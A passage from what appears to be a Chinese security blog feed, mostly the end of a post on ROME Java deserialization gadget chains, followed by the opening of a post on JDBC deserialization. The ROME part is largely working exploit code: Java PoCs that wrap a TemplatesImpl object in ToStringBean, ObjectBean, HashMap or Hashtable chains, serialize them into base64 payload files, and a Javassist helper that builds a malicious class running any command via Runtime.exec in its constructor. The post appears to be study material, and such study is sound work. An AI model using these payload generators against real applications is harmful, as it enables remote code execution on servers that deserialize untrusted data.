class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc2.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc2.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p>针对<code>HashMap</code>的过滤可以使用<code>HashTable</code>来绕过</p><p>在<code>HashTabl</code>e的<code>readObject</code>方法中对每一个<code>key</code>都进行了<code>reconstitutionPut</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820203751670.png" alt="image-20240820203751670"></p><p>跟进发现调用了<code>key.hashCode()</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820203823164.png" alt="image-20240820203823164"></p><p>直接把Hashmap改成HashTable即可</p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] evilCodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = &#123;evilCodes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(objectBean, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashtable);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc3.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc3.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="配合CC链"><a href="#配合CC链" class="headerlink" title="配合CC链"></a>配合CC链</h3><p>当然也可以使用CC中的任意方法调用来调用toString方法</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>JdbcRowSetImpl在FastJson中在&lt;&#x3D;1.2.24时使用的一个链子，这是针对后半段动态类加载不出网换成出网</p><h3 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h3><p>spring原生的toString利用链</p><p>需要添加spring依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.19.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="缩短Payload"><a href="#缩短Payload" class="headerlink" title="缩短Payload"></a>缩短Payload</h2><p>当payload长度被限制时, 即使最短的链条也无法成功执行, 因此需要进一步缩短</p><h3 id="使用Javassist缩短恶意class"><a href="#使用Javassist缩短恶意class" class="headerlink" title="使用Javassist缩短恶意class"></a>使用Javassist缩短恶意class</h3><blockquote><h4 id="Javassist："><a href="#Javassist：" class="headerlink" title="Javassist："></a>Javassist：</h4><p>Java 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。其使用方式类似于反射。</p></blockquote><blockquote><h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><p>可以将其理解成加强版的Class对象，我们可以通过CtClass对目标类进行各种操作。可以<code>ClassPool.get(ClassName)</code>中获取。</p></blockquote><blockquote><h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h4><p><code>ClassPool</code>是<code>CtClass</code>对象的容器。<code>CtClass</code>对象必须从该对象获得。如果<code>get()</code>在此对象上调用，则它将搜索表示的各种源<code>ClassPath</code> 以查找类文件，然后创建一个<code>CtClass</code>表示该类文件的对象。创建的对象将返回给调用者。可以将其理解为一个存放<code>CtClass</code>对象的容器。</p><p>获得方法： <code>ClassPool cp = ClassPool.getDefault();</code>。通过 <code>ClassPool.getDefault()</code> 获取的 <code>ClassPool</code> 使用 JVM 的类搜索路径。<strong>如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类</strong>，因为Web服务器使用多个类加载器作为系统类加载器。在这种情况下，<strong>ClassPool 必须添加额外的类搜索路径</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(&lt;Class&gt;));</span><br></pre></td></tr></table></figure></blockquote><blockquote><h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><p>同理，可以理解成加强版的<code>Method</code>对象。可通过<code>CtClass.getDeclaredMethod(MethodName)</code>获取，该类提供了一些方法以便我们能够直接修改方法体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类 CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>feng师傅还介绍了几种对应的语言扩展：</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>$0,$1, $2, …</td><td>$0 &#x3D; this; $1 &#x3D; args[1] …..</td></tr><tr><td>$args</td><td>方法参数数组.它的类型为 Object[]</td></tr><tr><td>$$</td><td>所有实参。例如, m($$) 等价于 m(1,2,…)</td></tr><tr><td>$cflow(…)</td><td>cflow 变量</td></tr><tr><td>$r</td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td>$w</td><td>包装器类型，用于强制类型转换</td></tr><tr><td>$_</td><td>返回值</td></tr><tr><td>$sig</td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td>$type</td><td>一个 java.lang.Class 对象，表示返回值类型</td></tr><tr><td>$class</td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr></tbody></table><p>关于<code>TemplatesImpl</code>这个类, 实际上不只是加载了字节码, 最终还对加载的类进行了实例化, 如图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821123921875.png" alt="image-20240821123921875"></p><p>因此可以把恶意代码放在构造器中</p><p>这样就可以简单生成一个恶意类, 这种直接生成字节码的方式跳过了编译阶段, 因此也不需要重写父类的方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetShellCode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CtClass <span class="title function_">getTemplatesImpl</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            ctClass = pool.makeClass(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public A()&#123;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(constructor);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ctClass;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, IOException &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">shell</span> <span class="operator">=</span> GetShellCode.getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        shell.writeFile(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\JavaassitShellCode&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException &#123;</span><br><span class="line">        WriteEvilClass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对比一下大小:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821125141207.png" alt="image-20240821125141207"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821125203492.png" alt="image-20240821125203492"></p><p>明显缩小了很多</p><p>直接把这个方法封装起来使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellCode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getEvilTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[][] evilbytes = &#123;getEvilClassCode(cmd, <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>)&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evilbytes);</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClassCode(String cmd, String superclass) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(superclass);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public A()&#123;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(constructor);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception  e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样写exp也简化了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/12768">https://xz.aliyun.com/t/12768</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;什么是ROME&quot;&gt;&lt;a href=&quot;#什么是ROME&quot; class=&quot;headerlink&quot; title=&quot;什么是ROME&quot;&gt;&lt;/a&gt;什么是ROME&lt;/h2&gt;&lt;p&gt;简单来说, ROME工具库实现Java对象和XML数据之间的转换&lt;/p&gt;
&lt;h2 id=&quot;环境依赖&quot;</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="ROME反序列化" scheme="http://example.com/tags/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>JDBC反序列化</title>
    <link href="http://example.com/2024/08/19/JDBC%20Attack%20for%20Mysql/"/>
    <id>http://example.com/2024/08/19/JDBC%20Attack%20for%20Mysql/</id>
    <published>2024-08-19T12:19:10.000Z</published>
    <updated>2024-08-22T07:36:26.986Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JDBC基础"><a href="#JDBC基础" class="headerlink" title="JDBC基础"></a>JDBC基础</h2><p>参考</p><p><a href="https://liaoxuefeng.com/books/java/jdbc/basic/">https://liaoxuefeng.com/books/java/jdbc/basic/</a></p><p>浅尝一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>数据库版本为 8.0.12</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdbcDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/learnjdbc?useSSL=false&amp;characterEncoding=utf8&amp;serverTimezone=GMT&quot;</span>; <span class="comment">// 这里加上serverTimezone=GMT 不然会报错</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;learn&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;learnpassword&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password)) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT id, grade, name, gender FROM students WHERE gender=? AND grade=?&quot;</span>))&#123;</span><br><span class="line">                ps.setObject(<span class="number">1</span>, <span class="string">&quot;M&quot;</span>);</span><br><span class="line">                ps.setObject(<span class="number">2</span>, <span class="number">3</span>);</span><br><span 